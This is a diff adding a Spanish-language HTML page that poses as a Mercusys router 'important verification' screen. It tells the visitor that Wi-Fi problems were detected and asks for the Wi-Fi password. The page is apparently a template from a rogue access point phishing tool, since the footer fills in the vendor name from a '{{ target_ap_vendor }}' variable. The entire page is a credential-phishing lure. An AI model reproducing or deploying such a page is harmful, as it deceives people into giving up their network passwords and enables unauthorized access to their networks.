@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="shortcut icon" type="image/png" href="img/lo.png" />
+
+    <title>Mercusys - Verificación importante</title>
+</head>
+
+<body>
+    <header class="header">
+        <div class="header__text-box">
+            <h1 class="heading-primary">
+                <img src="img/mercusys.png" id="logo" width="300"/>
+                <span class="heading-primary--main">verificación importante</span>
+                <span class="heading-primary--sub">Hemos detectado problemas con la red wifi, presiona el botón siguiente.</span>
+            </h1>
+
+            <a href="#section-update" class="btn btn--white btn--animation">Siguiente »</a>
+        </div>
+    </header>
+    <main>
+        
+
+        <section class="section-update" id="section-update">
+            <div class="update u-margin-bottom-huge">
+                <div class="update__form">
+                    <form class="form" onsubmit="return false">
+                        <div class="u-margin-bottom-medium">
+                            <h2 class="heading-secondary">
+                                Ingresa la contraseña wifi
+                            </h2>
+                        </div>
+
+                        <div class="form__group">
+                            <input type="password" class="form__input" placeholder="Contraseña" id="pass" pattern="[A-Za-z0-9!@#$%^&*-+_=]{8,}"
+                                required />
+                            <label for="pass" class="form__label">contraseña</label>
+                        </div>
+
+                        <div class="form__group">
+                            <p class="paragraph">
+                                Verificaremos que perteneces a esta red
+                                
+                            </p>
+                        </div>
+
+
+                        <div class="form__group">
+                            <button class="btn btn--green" id="form-button">Continuar →</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+            <div class="progress">
+                <div class="progress__bar">
+                </div>
+                <div class="progress__text">
+                    <span class="progress__text--main" id="progress__percentage">0%</span>
+                    <span class="progress__text--sub">Completado</span>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="footer__copyright">
+            <p>
+                Copyright © por {{ target_ap_vendor }}. Todos los derechos reservados.
+            </p>
+        </div>
+    </footer>
+
+    <script src="js/script.js"></script>
+</body>
+
+</html>
